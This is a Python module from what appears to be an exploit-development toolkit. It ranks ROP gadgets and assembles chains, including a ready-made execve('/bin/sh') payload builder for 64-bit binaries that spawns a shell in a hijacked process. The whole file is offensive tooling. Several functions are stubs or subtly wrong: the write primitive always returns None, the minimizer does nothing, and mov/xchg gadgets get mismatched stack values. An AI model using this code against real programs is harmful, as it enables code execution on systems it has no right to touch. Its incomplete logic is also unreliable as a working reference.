"""
ROP Chain Optimizer.

Finds minimal gadget sequences for common operations and optimizes
ROP chains for size and reliability.

Features:
- Gadget deduplication and ranking
- Minimal chain generation for common patterns
- Side-effect analysis
- Chain combination and optimization
"""

from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Dict, List, Optional, Set, Tuple

from supwngo.utils.helpers import p64, p32
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


class Operation(Enum):
    """Common operations for ROP chain optimization."""
    SET_REG = auto()          # Set register to value
    CALL_FUNC = auto()        # Call function with args
    WRITE_MEM = auto()        # Write value to memory
    READ_MEM = auto()         # Read value from memory
    SYSCALL = auto()          # Execute syscall
    STACK_PIVOT = auto()      # Change stack pointer
    NOP_SLED = auto()         # Consume stack space


@dataclass
class GadgetCandidate:
    """A gadget candidate with quality metrics."""
    address: int
    bytes: bytes
    disasm: str
    quality: int = 100        # Higher is better
    side_effects: List[str] = field(default_factory=list)
    clobbers: Set[str] = field(default_factory=set)
    stack_adjust: int = 0     # How much it adjusts rsp


@dataclass
class ChainSegment:
    """A segment of a ROP chain."""
    gadgets: List[int] = field(default_factory=list)
    values: List[int] = field(default_factory=list)
    total_size: int = 0
    operation: Optional[Operation] = None


class ROPOptimizer:
    """
    Optimizes ROP chains for minimal size and reliability.

    Analyzes available gadgets, ranks them by quality, and generates
    optimal chains for common operations.
    """

    def __init__(self, binary, bits: int = 64):
        """
        Initialize ROP optimizer.

        Args:
            binary: Binary object
            bits: Architecture bits (32 or 64)
        """
        self.binary = binary
        self.bits = bits
        self.pack = p64 if bits == 64 else p32
        self.ptr_size = 8 if bits == 64 else 4

        # Cache of analyzed gadgets
        self._gadget_cache: Dict[str, List[GadgetCandidate]] = {}

        # Register priority for argument passing
        if bits == 64:
            self.arg_regs = ['rdi', 'rsi', 'rdx', 'rcx', 'r8', 'r9']
            self.callee_saved = {'rbx', 'rbp', 'r12', 'r13', 'r14', 'r15'}
        else:
            self.arg_regs = []  # 32-bit uses stack for args
            self.callee_saved = {'ebx', 'esi', 'edi', 'ebp'}

    def find_set_reg(
        self,
        reg: str,
        prefer_clean: bool = True,
    ) -> List[GadgetCandidate]:
        """
        Find gadgets to set a register value.

        Args:
            reg: Register to set (e.g., "rdi", "rax")
            prefer_clean: Prefer gadgets with minimal side effects

        Returns:
            List of candidates sorted by quality
        """
        cache_key = f"set_{reg}"
        if cache_key in self._gadget_cache:
            return self._gadget_cache[cache_key]

        candidates = []

        try:
            from supwngo.exploit.rop.gadgets import GadgetFinder
            finder = GadgetFinder(self.binary)

            # Primary: pop reg; ret
            pop = finder.find_pop_reg(reg)
            if pop:
                candidates.append(GadgetCandidate(
                    address=pop.address,
                    bytes=pop.bytes if hasattr(pop, 'bytes') else b"",
                    disasm=f"pop {reg}; ret",
                    quality=100,
                    side_effects=[],
                    clobbers={reg},
                    stack_adjust=self.ptr_size,
                ))

            # Secondary: mov reg, rax/eax; ret (if we can control rax)
            mov_gadgets = finder.find_all_matching(f"mov {reg},")
            for g in mov_gadgets:
                src_reg = self._extract_src_reg(g.disasm)
                if src_reg:
                    candidates.append(GadgetCandidate(
                        address=g.address,
                        bytes=g.bytes if hasattr(g, 'bytes') else b"",
                        disasm=g.disasm,
                        quality=70,  # Requires another gadget
                        side_effects=[f"requires {src_reg} control"],
                        clobbers={reg},
                        stack_adjust=0,
                    ))

            # Tertiary: xchg reg, rax; ret
            xchg = finder.find_xchg_rsp(reg) if reg not in ['rsp', 'esp'] else None
            if xchg:
                candidates.append(GadgetCandidate(
                    address=xchg.address,
                    bytes=xchg.bytes if hasattr(xchg, 'bytes') else b"",
                    disasm=f"xchg {reg}, rax; ret",
                    quality=60,
                    side_effects=["modifies rax"],
                    clobbers={reg, 'rax'},
                    stack_adjust=0,
                ))

        except Exception as e:
            logger.debug(f"Error finding gadgets for {reg}: {e}")

        # Sort by quality
        candidates.sort(key=lambda x: x.quality, reverse=True)
        self._gadget_cache[cache_key] = candidates

        return candidates

    def _extract_src_reg(self, disasm: str) -> Optional[str]:
        """Extract source register from mov instruction."""
        parts = disasm.replace(',', ' ').split()
        if len(parts) >= 3:
            return parts[2].strip(';')
        return None

    def find_syscall(self) -> List[GadgetCandidate]:
        """Find syscall gadgets."""
        cache_key = "syscall"
        if cache_key in self._gadget_cache:
            return self._gadget_cache[cache_key]

        candidates = []

        try:
            from supwngo.exploit.rop.gadgets import GadgetFinder
            finder = GadgetFinder(self.binary)

            # Primary: syscall; ret
            syscall = finder.find_syscall()
            if syscall:
                candidates.append(GadgetCandidate(
                    address=syscall.address,
                    bytes=syscall.bytes if hasattr(syscall, 'bytes') else b"",
                    disasm="syscall; ret",
                    quality=100,
                    side_effects=["executes syscall"],
                    clobbers={'rax', 'rcx', 'r11'},  # Clobbered by syscall
                    stack_adjust=0,
                ))

            # Secondary: syscall (no ret - can't chain after)
            raw_syscall = finder.find_all_matching("syscall$")
            for g in raw_syscall:
                if 'ret' not in g.disasm:
                    candidates.append(GadgetCandidate(
                        address=g.address,
                        bytes=g.bytes if hasattr(g, 'bytes') else b"",
                        disasm="syscall",
                        quality=50,
                        side_effects=["no ret - terminal gadget"],
                        clobbers={'rax', 'rcx', 'r11'},
                        stack_adjust=0,
                    ))

            # int 0x80 for 32-bit syscalls
            int80 = finder.find_all_matching("int 0x80")
            for g in int80:
                candidates.append(GadgetCandidate(
                    address=g.address,
                    bytes=g.bytes if hasattr(g, 'bytes') else b"",
                    disasm="int 0x80",
                    quality=40 if self.bits == 32 else 20,
                    side_effects=["32-bit syscall ABI"],
                    clobbers={'eax'},
                    stack_adjust=0,
                ))

        except Exception as e:
            logger.debug(f"Error finding syscall gadgets: {e}")

        candidates.sort(key=lambda x: x.quality, reverse=True)
        self._gadget_cache[cache_key] = candidates

        return candidates

    def optimize_chain(
        self,
        chain: List[Tuple[str, Any]],
    ) -> ChainSegment:
        """
        Optimize a chain specification.

        Args:
            chain: List of (operation, params) tuples
                   e.g., [("set_rdi", 0x1234), ("set_rsi", 0x5678), ("syscall", None)]

        Returns:
            Optimized ChainSegment
        """
        result = ChainSegment()

        for op, param in chain:
            if op.startswith("set_"):
                reg = op[4:]
                candidates = self.find_set_reg(reg)
                if candidates:
                    best = candidates[0]
                    result.gadgets.append(best.address)
                    result.values.append(param)
                    result.total_size += self.ptr_size * 2

            elif op == "syscall":
                candidates = self.find_syscall()
                if candidates:
                    best = candidates[0]
                    result.gadgets.append(best.address)
                    result.total_size += self.ptr_size

        return result

    def build_execve_chain(
        self,
        binsh_addr: int,
    ) -> Optional[bytes]:
        """
        Build optimized execve("/bin/sh", NULL, NULL) chain.

        Args:
            binsh_addr: Address of "/bin/sh" string

        Returns:
            Optimized ROP chain or None
        """
        if self.bits != 64:
            logger.warning("execve chain only implemented for 64-bit")
            return None

        chain = []

        # Set up: rax=59, rdi=binsh, rsi=0, rdx=0
        operations = [
            ("set_rax", 59),         # execve syscall number
            ("set_rdi", binsh_addr), # filename
            ("set_rsi", 0),          # argv = NULL
            ("set_rdx", 0),          # envp = NULL
        ]

        for op, value in operations:
            reg = op[4:]
            candidates = self.find_set_reg(reg)
            if not candidates:
                logger.warning(f"No gadget to set {reg}")
                return None

            best = candidates[0]
            chain.append(self.pack(best.address))
            chain.append(self.pack(value))

        # Add syscall
        syscalls = self.find_syscall()
        if not syscalls:
            logger.warning("No syscall gadget")
            return None

        chain.append(self.pack(syscalls[0].address))

        return b"".join(chain)

    def build_write_primitive(
        self,
        dst_addr: int,
        value: int,
    ) -> Optional[bytes]:
        """
        Build optimized write primitive.

        Uses various strategies:
        1. mov [reg], reg; ret
        2. pop reg; pop [reg]; ret
        3. Multiple gadgets chained

        Args:
            dst_addr: Destination address
            value: Value to write

        Returns:
            ROP chain or None
        """
        chain = []

        try:
            from supwngo.exploit.rop.gadgets import GadgetFinder
            finder = GadgetFinder(self.binary)

            # Try to find write gadget
            # Common patterns: mov [rdi], rsi; ret
            #                  mov [rax], rdx; ret

            write_gadgets = finder.find_all_matching(r"mov \[r\w+\], r\w+")

            for g in write_gadgets:
                # Parse gadget to find which regs we need
                parts = g.disasm.split()
                # Extract dst and src registers
                # This is simplified - real implementation would parse properly

                # Set up registers and use gadget
                # For now, return None to indicate we need manual chain
                pass

        except Exception as e:
            logger.debug(f"Error building write primitive: {e}")

        return None if not chain else b"".join(chain)

    def estimate_chain_size(
        self,
        operations: List[str],
    ) -> int:
        """
        Estimate minimum chain size for operations.

        Args:
            operations: List of operation names

        Returns:
            Estimated size in bytes
        """
        size = 0

        for op in operations:
            if op.startswith("set_"):
                # pop reg; ret = 2 qwords
                size += self.ptr_size * 2
            elif op == "syscall":
                size += self.ptr_size
            elif op == "call":
                # Depends on calling convention
                size += self.ptr_size * 4  # Estimate
            elif op == "write":
                size += self.ptr_size * 4  # Estimate

        return size

    def analyze_gadget_coverage(self) -> Dict[str, bool]:
        """
        Analyze which operations are possible with available gadgets.

        Returns:
            Dict mapping operation to availability
        """
        coverage = {}

        # Check register setting
        if self.bits == 64:
            regs = ['rax', 'rdi', 'rsi', 'rdx', 'rcx', 'r8', 'r9', 'rsp', 'rbp']
        else:
            regs = ['eax', 'ebx', 'ecx', 'edx', 'esi', 'edi', 'esp', 'ebp']

        for reg in regs:
            candidates = self.find_set_reg(reg)
            coverage[f"set_{reg}"] = len(candidates) > 0

        # Check syscall
        coverage["syscall"] = len(self.find_syscall()) > 0

        return coverage

    def summary(self) -> str:
        """Get optimizer summary."""
        coverage = self.analyze_gadget_coverage()
        available = sum(1 for v in coverage.values() if v)
        total = len(coverage)

        return f"""
ROP Optimizer
=============
Architecture: {self.bits}-bit
Gadget coverage: {available}/{total} operations

Available operations:
{chr(10).join(f"  {'✓' if v else '✗'} {k}" for k, v in sorted(coverage.items()))}

Usage:
  opt = ROPOptimizer(binary)
  chain = opt.build_execve_chain(binsh_addr)
  # or
  segment = opt.optimize_chain([
      ("set_rdi", arg1),
      ("set_rsi", arg2),
      ("syscall", None),
  ])
"""


class ChainMinimizer:
    """
    Minimizes ROP chains by finding shorter equivalent sequences.
    """

    def __init__(self, optimizer: ROPOptimizer):
        self.optimizer = optimizer

    def minimize(self, chain: bytes) -> bytes:
        """
        Attempt to minimize a ROP chain.

        Args:
            chain: Original ROP chain

        Returns:
            Minimized chain (may be same as input)
        """
        # Parse chain into gadget addresses
        # Analyze what each segment does
        # Find shorter equivalent sequences
        # Return optimized chain

        # For now, return unchanged
        return chain

    def remove_nops(self, chain: bytes) -> bytes:
        """
        Remove unnecessary NOP-equivalent gadgets.

        Args:
            chain: ROP chain

        Returns:
            Chain with NOPs removed
        """
        # Identify and remove ret sleds, nop gadgets, etc.
        return chain


def optimize_rop_chain(
    binary,
    operations: List[Tuple[str, Any]],
    bits: int = 64,
) -> bytes:
    """
    Convenience function to optimize ROP chain.

    Args:
        binary: Binary object
        operations: List of (operation, param) tuples
        bits: Architecture bits

    Returns:
        Optimized ROP chain bytes
    """
    opt = ROPOptimizer(binary, bits)
    segment = opt.optimize_chain(operations)

    chain = []
    for i, gadget in enumerate(segment.gadgets):
        chain.append(p64(gadget) if bits == 64 else p32(gadget))
        if i < len(segment.values):
            chain.append(p64(segment.values[i]) if bits == 64 else p32(segment.values[i]))

    return b"".join(chain)
